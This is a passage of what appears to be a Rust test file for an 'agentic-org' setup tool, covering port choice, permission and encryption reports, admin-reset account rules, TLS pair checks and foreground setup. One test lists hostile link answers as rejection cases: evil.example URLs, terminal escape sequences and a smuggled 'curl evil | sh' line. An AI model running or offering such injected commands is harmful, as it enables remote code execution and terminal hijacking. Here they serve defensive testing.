use super::*;

#[test]
fn ports_default_to_7420_and_named_instances_take_the_first_free_from_7421() {
    assert_eq!(
        choose_port(None, None, NAMED_PORT_BASE, |_| true, &[]).unwrap(),
        7420
    );
    assert_eq!(
        choose_port(Some("default"), None, NAMED_PORT_BASE, |_| true, &[]).unwrap(),
        7420
    );
    assert_eq!(
        choose_port(Some("lab"), None, NAMED_PORT_BASE, |p| p != 7421, &[]).unwrap(),
        7422
    );
    assert_eq!(
        choose_port(Some("lab"), Some(9000), NAMED_PORT_BASE, |_| true, &[]).unwrap(),
        9000
    );
}

/// The production search base is 7421, the port after `default`'s; another base moves the
/// whole search and is named in the refusal.
#[test]
fn the_named_port_search_starts_at_7421_and_at_no_other_base_unless_given() {
    assert_eq!(NAMED_PORT_BASE, 7421);
    assert_eq!(
        choose_port(Some("lab"), None, NAMED_PORT_BASE, |_| true, &[]).unwrap(),
        7421
    );
    assert_eq!(
        choose_port(Some("lab"), None, 31000, |p| p != 31000, &[]).unwrap(),
        31001
    );
    // The base does not move `default`, nor an explicit port.
    assert_eq!(choose_port(None, None, 31000, |_| true, &[]).unwrap(), 7420);
    assert_eq!(
        choose_port(Some("lab"), Some(9000), 31000, |_| true, &[]).unwrap(),
        9000
    );
    let why = choose_port(Some("lab"), None, 65535, |_| false, &[]).unwrap_err();
    assert!(why.contains("from 65535"), "{why}");
}

#[test]
fn ports_other_instances_saved_are_never_chosen() {
    // A stopped instance's saved port is free to bind, but it is still that instance's.
    let saved = [("a".to_owned(), 7421), ("b".to_owned(), 7423)];
    assert_eq!(
        choose_port(Some("lab"), None, NAMED_PORT_BASE, |p| p != 7422, &saved).unwrap(),
        7424
    );
    let why = choose_port(Some("lab"), Some(7423), NAMED_PORT_BASE, |_| true, &saved).unwrap_err();
    assert!(
        why.contains("saved address of instance \"b\"") && why.contains("--port"),
        "{why}"
    );
    let taken = [("lab".to_owned(), DEFAULT_PORT)];
    let why = choose_port(None, None, NAMED_PORT_BASE, |_| true, &taken).unwrap_err();
    assert!(
        why.contains("instance \"lab\"") && why.contains("nothing was saved"),
        "{why}"
    );
}

#[test]
fn a_held_saved_port_names_the_address_and_the_way_out() {
    let why = port_held_elsewhere(&loopback(7425).unwrap(), Some("lab"));
    assert!(
        why.contains("port 7425 on 127.0.0.1") && why.contains("another program"),
        "{why}"
    );
    assert!(why.ends_with("run agentic-org setup --name lab"), "{why}");
    assert!(port_held_elsewhere(&loopback(7420).unwrap(), None).ends_with("run agentic-org setup"));
    // X5 review, fourth round, P2-2: the instance's own address, in its own family.
    let six: ListenConfig = serde_json::from_str(
        r#"{"address":"::1","port":7426,"scheme":"http_loopback","origin":"http://[::1]:7426","hsts":"off"}"#,
    )
    .unwrap();
    assert!(port_held_elsewhere(&six, None).contains("port 7426 on ::1"));
}

/// X5 review, fourth round, P2-2: whether a saved address is free is asked of that address,
/// in its own family: an IPv4 listener on the same port does not hold an IPv6 address.
#[test]
fn a_saved_address_is_probed_in_its_own_family() {
    let Ok(six) = std::net::TcpListener::bind(("::1", 0)) else {
        println!("skipped: this machine has no IPv6 loopback");
        return;
    };
    let port = six.local_addr().unwrap().port();
    drop(six);
    let Ok(four) = std::net::TcpListener::bind(("127.0.0.1", port)) else {
        println!("skipped: the port was taken meanwhile");
        return;
    };
    let listen: ListenConfig = serde_json::from_str(&format!(
        r#"{{"address":"::1","port":{port},"scheme":"http_loopback","origin":"http://[::1]:{port}","hsts":"off"}}"#
    ))
    .unwrap();
    assert!(!port_free(port), "the IPv4 address is held");
    assert!(
        address_free(&listen),
        "the IPv6 address was judged by the IPv4 one"
    );
    drop(four);
}

#[test]
fn an_occupied_port_is_an_actionable_error() {
    for (name, requested) in [(None, None), (None, Some(9000)), (Some("lab"), Some(9000))] {
        let why = choose_port(name, requested, NAMED_PORT_BASE, |_| false, &[]).unwrap_err();
        assert!(why.contains("in use") && why.contains("--port"), "{why}");
        assert!(why.contains("nothing was saved"), "{why}");
    }
    assert!(choose_port(None, Some(0), NAMED_PORT_BASE, |_| true, &[]).is_err());
}

#[test]
fn the_protection_report_states_encryption_modes_and_isolation() {
    let mac = Wording {
        name: "FileVault",
        setting: "FileVault in System Settings › Privacy & Security",
    };
    let on = protection_report(&EncryptionState::On, mac, "alex", &[], &[]);
    assert_eq!(on[0], "Disk encryption (FileVault): on.");
    assert!(on[1].contains("readable only by alex (folders 700, files 600)"));
    assert!(on[2].contains("same-user mode"));
    let off = protection_report(&EncryptionState::Off, mac, "alex", &[], &[]);
    assert_eq!(
        off[0],
        "Disk encryption is off. Agentic Org does not encrypt its data; turn on FileVault in \
         System Settings › Privacy & Security."
    );
    let unknown = protection_report(
        &EncryptionState::Unknown("no volume".into()),
        mac,
        "alex",
        &[],
        &[],
    );
    assert_eq!(
        unknown[0],
        "Disk encryption could not be determined (no volume). Agentic Org does not encrypt \
         its data; check FileVault in System Settings › Privacy & Security."
    );
    let open = protection_report(
        &EncryptionState::On,
        mac,
        "alex",
        &[("/r/x".into(), 0o644)],
        &[],
    );
    assert!(
        open[1].contains("1 path(s)") && open[2] == "  644 /r/x",
        "{open:?}"
    );
    // This system's own words fit the same sentences.
    let here = org_platform::disk::wording();
    let on = protection_report(&EncryptionState::On, here, "alex", &[], &[]);
    assert_eq!(on[0], format!("Disk encryption ({}): on.", here.name));
    let off = protection_report(&EncryptionState::Off, here, "alex", &[], &[]);
    assert!(
        off[0].ends_with(&format!("turn on {}.", here.setting)),
        "{off:?}"
    );
}

#[test]
fn a_service_that_stops_at_logout_is_reported_with_the_command_that_changes_it() {
    assert!(lingering_report(&Lingering::On, "alex").is_empty());
    assert!(lingering_report(&Lingering::NotApplicable, "alex").is_empty());
    let off = lingering_report(
        &Lingering::Off {
            enable: "loginctl enable-linger alex".into(),
        },
        "alex",
    );
    assert_eq!(
        off,
        [
            "The service runs only while alex is logged in: it stops at logout and does not \
             start when the machine starts.",
            "To keep it running without a login session, run: loginctl enable-linger alex",
        ]
    );
    let unknown = lingering_report(&Lingering::Unknown("loginctl could not run".into()), "alex");
    assert_eq!(unknown.len(), 1);
    assert!(
        unknown[0].contains("(loginctl could not run)"),
        "{unknown:?}"
    );
}

#[test]
fn a_missing_service_manager_is_reported_with_the_foreground_command() {
    let text = no_service_manager(ServiceError::Unavailable(
        "XDG_RUNTIME_DIR is not set, so this session has no systemd user manager".into(),
    ));
    assert!(text.contains("XDG_RUNTIME_DIR is not set"), "{text}");
    assert!(
        text.contains("\"service\": \"foreground\"") && text.contains("agentic-org serve --setup"),
        "{text}"
    );
    assert!(text.ends_with("nothing was changed"), "{text}");
    let other = no_service_manager(ServiceError::System("launchctl exited with 5".into()));
    assert!(!other.contains("foreground"), "{other}");
}

#[test]
fn modes_are_read_back_from_disk() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("r");
    std::fs::create_dir(&root).unwrap();
    std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o700)).unwrap();
    std::fs::write(root.join("a"), b"x").unwrap();
    std::fs::set_permissions(root.join("a"), std::fs::Permissions::from_mode(0o600)).unwrap();
    assert_eq!(mode_exceptions(&root).unwrap(), (vec![], vec![]));
    std::fs::set_permissions(root.join("a"), std::fs::Permissions::from_mode(0o644)).unwrap();
    assert_eq!(
        mode_exceptions(&root).unwrap(),
        (vec![(root.join("a"), 0o644)], vec![])
    );
    // X5 review F5: a folder inside that cannot be read is reported, never a refusal.
    let closed = root.join("closed");
    std::fs::create_dir(&closed).unwrap();
    std::fs::write(closed.join("b"), b"x").unwrap();
    std::fs::set_permissions(&closed, std::fs::Permissions::from_mode(0o000)).unwrap();
    let found = mode_exceptions(&root);
    std::fs::set_permissions(&closed, std::fs::Permissions::from_mode(0o700)).unwrap();
    let (exceptions, unreadable) = found.unwrap();
    assert_eq!(
        exceptions,
        vec![(root.join("a"), 0o644), (closed.clone(), 0o000)]
    );
    assert_eq!(unreadable, vec![closed.clone()]);
    let report = protection_report(
        &EncryptionState::On,
        org_platform::disk::wording(),
        "alex",
        &exceptions,
        &unreadable,
    );
    assert!(
        report
            .iter()
            .any(|line| line.contains("1 path(s) in the instance folder could not be read"))
            && report.contains(&format!("  {}", closed.display())),
        "{report:?}"
    );
    // The root itself must be readable.
    assert!(mode_exceptions(&root.join("missing")).is_err());
}

#[test]
fn the_development_pin_is_valid_and_stable() {
    let pin = release_pin().unwrap();
    pin.validate().unwrap();
    assert_eq!(pin, release_pin().unwrap());
}

#[test]
fn a_repeated_setup_with_an_administrator_says_where_to_sign_in() {
    assert_eq!(
        running_with_administrator("default", "http://127.0.0.1:7420"),
        "Instance default is running. Open http://127.0.0.1:7420 and sign in."
    );
}

#[test]
fn admin_reset_off_a_terminal_refuses_with_the_spec_copy_before_anything_else() {
    let mut out = Vec::new();
    let refused = admin_reset(Some("no-such-instance"), None, false, &mut out).unwrap_err();
    assert_eq!(refused, NOT_A_TERMINAL);
    assert!(out.is_empty());
}

/// SIGN-33: whose instance `admin reset` acts on. Root acts for the account it names (or
/// the one `sudo` names) and never for itself; anyone else acts only for itself.
#[test]
fn admin_reset_acts_for_the_named_service_user_only_when_root_runs_it() {
    let agentic = Account {
        uid: 61000,
        gid: 61000,
    };
    let by_name = |name: &str| match name {
        "agentic" => Some(agentic),
        "root" => Some(Account { uid: 0, gid: 0 }),
        "other" => Some(Account {
            uid: 1001,
            gid: 1001,
        }),
        _ => None,
    };
    let by_id = |uid: u32| match uid {
        61000 => Some(agentic),
        0 => Some(Account { uid: 0, gid: 0 }),
        _ => None,
    };
    let decide = |me, named, sudo| service_account(me, true, named, sudo, by_name, by_id);
    // Root: the named account, or the one sudo names; --user wins.
    assert_eq!(decide(0, Some("agentic"), None), Ok(Some(agentic)));
    assert_eq!(decide(0, None, Some("61000")), Ok(Some(agentic)));
    assert_eq!(decide(0, Some("agentic"), Some("1001")), Ok(Some(agentic)));
    assert!(decide(0, None, None)
        .unwrap_err()
        .contains("--user <service user>"));
    assert!(decide(0, Some("nobody-here"), None)
        .unwrap_err()
        .contains("no account"));
    assert!(decide(0, None, Some("4242"))
        .unwrap_err()
        .contains("no account"));
    assert!(decide(0, None, Some("not-a-number")).is_err());
    // Root never acts for root: the service does not run as root.
    assert!(decide(0, Some("root"), None)
        .unwrap_err()
        .contains("does not run as root"));
    assert!(decide(0, None, Some("0")).is_err());
    // Where peers are identified by image, root has no route to the service user.
    for named in [None, Some("agentic")] {
        let refused = service_account(
            0,
            false,
            named,
            Some("61000"),
            |_| panic!("root must be refused before looking up the service user"),
            |_| panic!("root must be refused before looking up the service user"),
        )
        .unwrap_err();
        assert_eq!(refused, "Run agentic-org admin reset as the service user.");
    }
    assert_eq!(
        service_account(61000, false, None, None, by_name, by_id),
        Ok(None)
    );
    // Anyone else: itself, with or without its own name; never another account.
    assert_eq!(decide(61000, None, None), Ok(None));
    assert_eq!(
        decide(61000, None, Some("0")),
        Ok(None),
        "SUDO_UID means nothing here"
    );
    assert_eq!(decide(61000, Some("agentic"), None), Ok(None));
    assert!(decide(61000, Some("other"), None)
        .unwrap_err()
        .contains("only root acts for another user"));
    assert!(decide(1001, Some("agentic"), None).is_err());
    assert!(decide(61000, Some("nobody-here"), None).is_err());
    // The real account database knows this process's own user, by number and by name.
    let me = account_by_id(crate::home::euid()).expect("this user has an account");
    assert_eq!(me.uid, crate::home::euid());
    assert_eq!(account_by_name("no-such-account-x5"), None);
}

/// A service manager no foreground setup may touch.
struct Untouchable;
impl ServiceManager for Untouchable {
    fn register(&self, _: &Unit) -> Result<org_platform::service::Registration, ServiceError> {
        panic!("the foreground mode registered a service")
    }
    fn start(&self, _: &str) -> Result<(), ServiceError> {
        panic!("the foreground mode started a service")
    }
    fn stop(&self, _: &str) -> Result<(), ServiceError> {
        panic!("the foreground mode stopped a service")
    }
    fn status(&self, _: &str) -> Result<ServiceStatus, ServiceError> {
        panic!("the foreground mode asked for a service's status")
    }
    fn unregister(&self, _: &str) -> Result<(), ServiceError> {
        panic!("the foreground mode unregistered a service")
    }
    fn available(&self) -> Result<(), ServiceError> {
        panic!("the foreground mode asked whether a service manager answers")
    }
    fn lingering(&self) -> Lingering {
        panic!("the foreground mode asked about lingering")
    }
}

/// An `https` setup file: a supplied pair is read and verified before anything is saved
/// (a key that is not the certificate's refuses the file and leaves no record); a good one
/// is recorded by its paths, and setup prints its fingerprint. Without a pair, setup says
/// the instance makes its own certificate.
#[test]
fn https_setup_verifies_a_supplied_pair_before_anything_is_saved() {
    use crate::instance::setup::{Configured, SuppliedTls};
    use sha2::Digest;
    let temp =
        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
    let root = temp.path().canonicalize().unwrap();
    let now = crate::web_tls::now().unwrap();
    let (cert, key) = crate::web_tls::tests::pair_for(&["127.0.0.1"], now - 60, now + 86_400);
    let (_, other_key) = crate::web_tls::tests::pair_for(&["127.0.0.1"], now - 60, now + 86_400);
    let files = root.join("tls");
    std::fs::create_dir(&files).unwrap();
    std::fs::write(files.join("cert.pem"), &cert).unwrap();
    std::fs::write(files.join("key.pem"), &key).unwrap();
    std::fs::write(files.join("other.pem"), &other_key).unwrap();
    let run = |base_name: &str, tls: Option<SuppliedTls>| {
        let base = root.join(base_name);
        for dir in [base.clone(), base.join("t")] {
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
        }
        let paths = Paths::at(&base, base.join("t"), None).unwrap();
        let port = free_port();
        let listen = serde_json::from_value(serde_json::json!({
            "address": "127.0.0.1", "port": port, "scheme": "https",
            "origin": format!("https://127.0.0.1:{port}"), "hsts": "off"
        }))
        .unwrap();
        let input = Input {
            version: 1,
            service: Service::Foreground,
            root: base.join("data"),
            credentials: None,
            listen,
        };
        let platform = Platform {
            service: Box::new(Untouchable),
            disk: Box::new(org_platform::testing::FakeDiskEncryption(
                EncryptionState::Unknown("a test".into()),
            )),
            credentials: CredentialDirectory::Unused,
        };
        let request = Request {
            name: None,
            port: None,
            prompt: None,
            named_port_base: NAMED_PORT_BASE,
            program: PathBuf::from("/no-such-program"),
            env: Vec::new(),
            terminal: false,
            development_keys: None,
            configuration: Some(Configuration(Configured { input, tls })),
        };
        let mut out = Vec::new();
        let result = run_at(&paths, &platform, request, &mut out).map(drop);
        (result, String::from_utf8(out).unwrap(), base)
    };
    let supplied = |key: &str| SuppliedTls {
        cert: files.join("cert.pem"),
        key: files.join(key),
    };
    let (refused, _, base) = run("mismatched", Some(supplied("other.pem")));
    let refused = refused.unwrap_err();
    assert!(
        refused.contains("tls_key_mismatch") && refused.ends_with("nothing was saved"),
        "{refused}"
    );
    assert!(!refused.contains("-----BEGIN"), "{refused}");
    assert!(
        Journal::snapshot(&base, None).is_err(),
        "a record was saved"
    );
    let (missing, _, _) = run("missing", Some(supplied("gone.pem")));
    assert!(missing.unwrap_err().contains("gone.pem"));
    let (done, out, base) = run("supplied", Some(supplied("key.pem")));
    done.unwrap();
    let der =
        org_host_control::pem::first_block(&cert, org_host_control::pem::CERTIFICATE).unwrap();
    let shown = crate::web_tls::Fingerprint(sha2::Sha256::digest(der.bytes()).into());
    assert!(
        out.contains(&format!(
            "TLS: supplied by the operator, SHA-256 fingerprint {shown}"
        )),
        "{out}"
    );
    assert!(!out.contains("PRIVATE KEY"), "{out}");
    let record = Journal::snapshot(&base, None).unwrap();
    assert_eq!(record.tls, Some(supplied("key.pem")));
    let (made, out, base) = run("made", None);
    made.unwrap();
    assert!(
        out.contains("TLS: the instance makes its own certificate for https://127.0.0.1:"),
        "{out}"
    );
    assert_eq!(Journal::snapshot(&base, None).unwrap().tls, None);
}

/// Non-interactive setup in the foreground mode: the record is frozen from the file's
/// input, the instance is reserved and its layout made, and that is all. No service
/// manager is asked anything, nothing is waited for, no link is asked for or printed, and a
/// second run changes nothing. A file that differs from what the instance was set up with
/// is refused.
#[test]
fn foreground_setup_reserves_the_instance_and_never_touches_a_service_manager() {
    let temp =
        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
    let base = temp.path().canonicalize().unwrap().join("b");
    for dir in [base.clone(), base.join("t")] {
        std::fs::create_dir(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
    let paths = Paths::at(&base, base.join("t"), None).unwrap();
    let port = free_port();
    let input = Input {
        version: 1,
        service: Service::Foreground,
        root: base.join("data"),
        credentials: None,
        listen: loopback(port).unwrap(),
    };
    let platform = Platform {
        service: Box::new(Untouchable),
        disk: Box::new(org_platform::testing::FakeDiskEncryption(
            EncryptionState::Unknown("a test".into()),
        )),
        credentials: CredentialDirectory::Unused,
    };
    let run = |input: &Input| {
        let request = Request {
            name: None,
            port: None,
            prompt: None,
            named_port_base: NAMED_PORT_BASE,
            program: PathBuf::from("/no-such-program"),
            env: Vec::new(),
            // Even at a terminal: the configuration decides, and no link is printed.
            terminal: true,
            development_keys: None,
            configuration: Some(Configuration::from(input.clone())),
        };
        assert!(request.configuration.as_ref().unwrap().foreground());
        let mut out = Vec::new();
        let result = run_at(&paths, &platform, request, &mut out);
        (result, String::from_utf8(out).unwrap())
    };
    let (result, out) = run(&input);
    // The address it checked is held from that check on, and handed over to the process
    // that serves the instance (X5 review, third round, P2): no other program can bind it.
    let held = result
        .unwrap()
        .expect("the browser listener of a first foreground setup");
    assert!(
        std::net::TcpListener::bind(("127.0.0.1", port)).is_err(),
        "the reserved address was free for another program after setup checked it"
    );
    let listener = held.take().expect("handed over once");
    assert_eq!(
        listener.local_addr().unwrap(),
        std::net::SocketAddr::from(([127, 0, 0, 1], port))
    );
    assert!(held.take().is_none(), "handed over twice");
    drop(listener);
    assert!(
        out.contains("Service: none is registered (foreground mode)."),
        "{out}"
    );
    assert!(out.contains("agentic-org serve --setup <file>"), "{out}");
    let reset = match crate::test_programs::image_identity() {
        org_platform_host::admission::ImageIdentity::VerifiedBytes => {
            "run as root: agentic-org admin reset --user "
        }
        org_platform_host::admission::ImageIdentity::CodeSignature => {
            "run as the service user: agentic-org admin reset"
        }
    };
    assert!(out.contains(reset), "{out}");
    assert!(!out.contains("/register"), "{out}");
    assert!(!out.contains("Service registered"), "{out}");
    let record = Journal::snapshot(&base, None).unwrap();
    assert_eq!(record.input, input);
    assert!(record.offline, "non-interactive setup is offline");
    assert!(record.instance_id.is_some());
    assert_eq!(
        (
            record.service_registered,
            record.registry_created,
            record.initial_link_issued,
            &record.credentials
        ),
        (false, false, false, &None)
    );
    assert!(
        base.join("data/office-state").is_dir(),
        "the layout is made"
    );
    // A second run is a no-op that says the same, and holds no address: the instance's
    // host binds it. It does not walk the instance's data again for its modes (X5 review
    // F5): that is the first run's report.
    assert!(out.contains("File permissions: "), "{out}");
    let locator = std::fs::File::options()
        .write(true)
        .open(paths.locator.join("registry.lock"))
        .unwrap();
    locator.lock().unwrap();
    let (result, again) = std::thread::scope(|scope| {
        scope.spawn(move || {
            std::thread::sleep(Duration::from_millis(250));
            locator.unlock().unwrap();
        });
        run(&input)
    });
    assert!(result.unwrap().is_none());
    let reported: Vec<&str> = out
        .lines()
        .filter(|line| {
            !(line.starts_with("Disk encryption")
                || line.starts_with("File permissions")
                || line.starts_with("Agents run as"))
        })
        .collect();
    assert_eq!(again.lines().collect::<Vec<_>>(), reported);
    assert_eq!(Journal::snapshot(&base, None).unwrap(), record);
    // Another configuration for the same instance is refused, whatever differs.
    let mut other = input.clone();
    other.service = Service::Registered;
    let mut moved = input.clone();
    moved.listen = loopback(port.checked_add(1).unwrap_or(port - 1)).unwrap();
    for changed in [other, moved] {
        let request = Request {
            name: None,
            port: None,
            prompt: None,
            named_port_base: NAMED_PORT_BASE,
            program: PathBuf::from("/no-such-program"),
            env: Vec::new(),
            terminal: false,
            development_keys: None,
            configuration: Some(Configuration::from(changed)),
        };
        let mut out = Vec::new();
        let refused = run_at(&paths, &platform, request, &mut out).unwrap_err();
        assert!(refused.contains("a different configuration"), "{refused}");
        assert!(refused.ends_with("nothing was changed"), "{refused}");
    }
    assert_eq!(Journal::snapshot(&base, None).unwrap(), record);
}

/// The notice covers anyone who can reach the listen address, including on a bare host.
#[test]
fn a_published_plain_http_listener_warns_every_reachable_peer() {
    let listen: ListenConfig = serde_json::from_str(
        r#"{"address":"0.0.0.0","port":8443,"scheme":"http_published","origin":"http://127.0.0.1:8443","hsts":"off"}"#,
    )
    .unwrap();
    assert_eq!(
        published_http_notice(&listen),
        "serving plain HTTP on a published port (0.0.0.0:8443). Every machine that can \
         reach the listen address can reach sign-in and sessions in plain text. In Docker, \
         publish only on the host's 127.0.0.1 (docker run -p 127.0.0.1:8443:8443). Open \
         http://127.0.0.1:8443. For HTTPS, set up an instance with \"scheme\": \"https\"."
    );
}

/// X5 review V1: a setup from a file that is refused leaves nothing it made, and a
/// corrected file then works. The credential directory and a held port are asked before
/// anything is saved; a record an earlier run froze without reserving an instance pins
/// nothing; and a record that names its instance still refuses another file.
#[test]
fn a_refused_setup_from_a_file_leaves_nothing_and_a_corrected_file_then_works() {
    let temp =
        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
    let base = temp.path().canonicalize().unwrap().join("b");
    let outside = temp.path().canonicalize().unwrap().join("o");
    for dir in [base.clone(), base.join("t"), outside.clone()] {
        std::fs::create_dir(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
    let paths = Paths::at(&base, base.join("t"), None).unwrap();
    /// A manager that refuses to register: a registered setup stops there, after its
    /// reservation.
    struct Refusing;
    impl ServiceManager for Refusing {
        fn register(&self, _: &Unit) -> Result<org_platform::service::Registration, ServiceError> {
            Err(ServiceError::System(
                "no service manager in this test".into(),
            ))
        }
        fn start(&self, _: &str) -> Result<(), ServiceError> {
            unreachable!()
        }
        fn stop(&self, _: &str) -> Result<(), ServiceError> {
            unreachable!()
        }
        fn status(&self, _: &str) -> Result<ServiceStatus, ServiceError> {
            unreachable!()
        }
        fn unregister(&self, _: &str) -> Result<(), ServiceError> {
            unreachable!()
        }
    }
    let platform = Platform {
        service: Box::new(Refusing),
        disk: Box::new(org_platform::testing::FakeDiskEncryption(
            EncryptionState::Unknown("a test".into()),
        )),
        credentials: CredentialDirectory::Unused,
    };
    let run = |input: &Input| {
        let request = Request {
            name: None,
            port: None,
            prompt: None,
            named_port_base: NAMED_PORT_BASE,
            program: PathBuf::from("/no-such-program"),
            env: Vec::new(),
            terminal: false,
            // Apart from what the test lists: a registered service of a development build
            // that records no credential directory needs it.
            development_keys: Some(temp.path().canonicalize().unwrap().join("k")),
            configuration: Some(Configuration::from(input.clone())),
        };
        let mut out = Vec::new();
        run_at(&paths, &platform, request, &mut out)
    };
    // Everything a refused setup could leave: the data folder, the secrets folder, the
    // record and the locator.
    let listing = |root: &Path| -> Vec<PathBuf> {
        let mut found = Vec::new();
        let mut pending = vec![root.to_owned()];
        while let Some(path) = pending.pop() {
            if let Ok(entries) = std::fs::read_dir(&path) {
                pending.extend(entries.map(|e| e.unwrap().path()));
            }
            found.push(path);
        }
        found.sort();
        found
    };
    let state = || {
        (
            listing(&outside),
            base.join("setup/default/setup.v1.json").exists(),
            listing(&base.join("locator")),
        )
    };
    let published = |port: u16| -> ListenConfig {
        serde_json::from_value(serde_json::json!({
            "address": "0.0.0.0", "port": port, "scheme": "http_published",
            "origin": format!("http://127.0.0.1:{port}"), "hsts": "off"
        }))
        .unwrap()
    };
    let port = free_port();
    let foreground = |credentials: Option<PathBuf>| Input {
        version: 1,
        service: Service::Foreground,
        root: outside.join("data"),
        credentials,
        listen: published(port),
    };
    // 1. A credential directory that cannot be used (a path that does not exist: the typo;
    //    a plain folder, which is no mount and, here, below a shared temporary folder).
    std::fs::create_dir(outside.join("secrets")).unwrap();
    std::fs::set_permissions(
        outside.join("secrets"),
        std::fs::Permissions::from_mode(0o700),
    )
    .unwrap();
    let before = state();
    for credentials in [outside.join("secret"), outside.join("secrets")] {
        let refused = run(&foreground(Some(credentials.clone()))).unwrap_err();
        assert!(
            refused.starts_with("the credential directory cannot be used: ")
                && refused.ends_with("nothing was saved"),
            "{refused}"
        );
        assert_eq!(state(), before, "{} left something", credentials.display());
        assert!(
            Journal::snapshot(&base, None).is_err(),
            "a record was saved"
        );
    }
    // 2. A registered service whose port another program holds.
    let held = std::net::TcpListener::bind(("127.0.0.1", 0)).unwrap();
    let registered = |port: u16| Input {
        version: 1,
        service: Service::Registered,
        root: outside.join("data"),
        credentials: None,
        listen: loopback(port).unwrap(),
    };
    let refused = run(&registered(held.local_addr().unwrap().port())).unwrap_err();
    assert!(
        refused.contains("is in use by another program") && refused.ends_with("nothing was saved"),
        "{refused}"
    );
    assert_eq!(state(), before);
    // 2b. And a foreground instance's (second round): its address is reserved with it and
    //     never changes, so a held one is refused before anything is saved, not left for the
    //     web process to fail on after the instance was set up.
    let wildcard = std::net::TcpListener::bind(("0.0.0.0", 0)).unwrap();
    let mut held_foreground = foreground(None);
    held_foreground.listen = published(wildcard.local_addr().unwrap().port());
    let refused = run(&held_foreground).unwrap_err();
    assert!(
        refused.contains("is in use by another program") && refused.ends_with("nothing was saved"),
        "{refused}"
    );
    assert_eq!(state(), before);
    assert!(
        Journal::snapshot(&base, None).is_err(),
        "a record was saved"
    );
    drop(wildcard);
    // 3. A record an earlier run froze and could not continue pins nothing.
    let journal = Journal::open(&base, None).unwrap();
    journal
        .freeze(
            foreground(Some(outside.join("secret"))),
            true,
            release_pin().unwrap(),
        )
        .unwrap();
    drop(journal);
    assert!(Journal::snapshot(&base, None)
        .unwrap()
        .instance_id
        .is_none());
    // 4. The corrected file works, and its record is the instance's.
    let corrected = foreground(None);
    run(&corrected).unwrap();
    let record = Journal::snapshot(&base, None).unwrap();
    assert_eq!(record.input, corrected);
    assert!(record.instance_id.is_some());
    assert!(outside.join("data/office-state").is_dir());
    // 5. A completed setup still refuses another file, and keeps its record.
    let refused = run(&foreground(Some(outside.join("secrets")))).unwrap_err();
    assert!(refused.contains("a different configuration"), "{refused}");
    let refused = run(&registered(7499)).unwrap_err();
    assert!(refused.contains("a different configuration"), "{refused}");
    assert_eq!(Journal::snapshot(&base, None).unwrap(), record);
    assert!(Journal::open(&base, None).unwrap().abandon().is_err());
}

/// X5 review V4: of a service's answer to a link call, only this instance's own link is
/// ever shown. A service that answers with another origin, another path, a token that is
/// not the product's, or bytes a terminal would act on gets one fixed refusal, and none
/// of its bytes reach the output.
#[test]
fn only_this_instances_own_link_is_ever_printed() {
    use org_host_control::listen::ListenOrigin;
    let origin = ListenOrigin::parse("http://localhost:8443").unwrap();
    let token = "A".repeat(43);
    let good = format!("http://localhost:8443/register#{token}");
    assert_eq!(this_instances_link(&good, &origin), Ok(good.as_str()));
    for hostile in [
        "https://evil.example/register#x".to_owned(),
        format!("https://evil.example/register#{token}"),
        format!("http://localhost:8443.evil.example/register#{token}"),
        format!("http://localhost:8443/register#{token}\u{1b}]0;pwned\u{7}"),
        format!("http://localhost:8443/register#{token}\nrun: curl evil | sh"),
        format!("http://localhost:8443/register#{}", "A".repeat(42)),
        format!("http://localhost:8443/register#{}", "A".repeat(44)),
        format!("http://localhost:8443/register#{}=", "A".repeat(42)),
        format!("http://localhost:8443/register?next=//evil#{token}"),
        format!("http://localhost:8443/set-password#{token}"),
        format!("\u{1b}[2Jhttp://localhost:8443/register#{token}"),
        String::new(),
    ] {
        assert_eq!(
            this_instances_link(&hostile, &origin),
            Err(NOT_THIS_INSTANCES_LINK.into()),
            "{hostile:?}"
        );
    }

    // A fake host on a socket, as a process of the service user can bind one where the
    // system cannot identify the program behind `host.sock`: it greets as the instance and
    // answers `admin.reset` with a link of its own and terminal escape sequences.
    let dir = tempfile::tempdir().unwrap();
    let socket = dir.path().join("host.sock");
    let listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();
    const INSTANCE: &str = "01965d2e-8b1c-7c3a-9f00-0123456789ab";
    let answers = [
        format!(
            r#"{{"id":1,"result":{{"api_version":1,"server_version":"0","host":"\u001b]0;host\u0007","instance_id":"{INSTANCE}"}}}}"#
        ),
        r#"{"id":2,"result":{"outcome":"issued","url":"https://evil.example/register#x\u001b]0;pwned\u0007\u001b[2J","expires_at_ms":1}}"#.to_owned(),
    ];
    let fake = std::thread::spawn(move || {
        use std::io::{BufRead, BufReader, Write as _};
        let (stream, _) = listener.accept().unwrap();
        let mut reader = BufReader::new(stream.try_clone().unwrap());
        for answer in answers {
            let mut request = String::new();
            reader.read_line(&mut request).unwrap();
            writeln!(&stream, "{answer}").unwrap();
        }
    });
    let wire = connect_verified(&socket, INSTANCE, |_| Ok(())).unwrap();
    let mut out = Vec::new();
    let refused = reset_over(wire, &origin, None, &mut out).unwrap_err();
    fake.join().unwrap();
    assert_eq!(refused, NOT_THIS_INSTANCES_LINK);
    let printed = String::from_utf8(out).unwrap();
    assert!(
        !printed.contains("evil") && !printed.contains('\u{1b}') && !printed.contains('\u{7}'),
        "{printed:?}"
    );
    assert!(!refused.contains("evil") && !refused.contains('\u{1b}'));
}

/// X5 review, second round: root's reset for the service user prints nothing that user
/// controls unescaped. Here the lookup itself fails: the user's registered data folder, whose
/// path carries terminal control sequences, is gone, and the locator's refusal names it.
/// (Root acts as this test's own user, which needs no privilege.)
#[test]
fn roots_reset_escapes_what_a_failed_lookup_of_the_service_users_instance_says() {
    let temp =
        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
    let base = temp.path().canonicalize().unwrap().join("b");
    for dir in [base.clone(), base.join("t")] {
        std::fs::create_dir(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
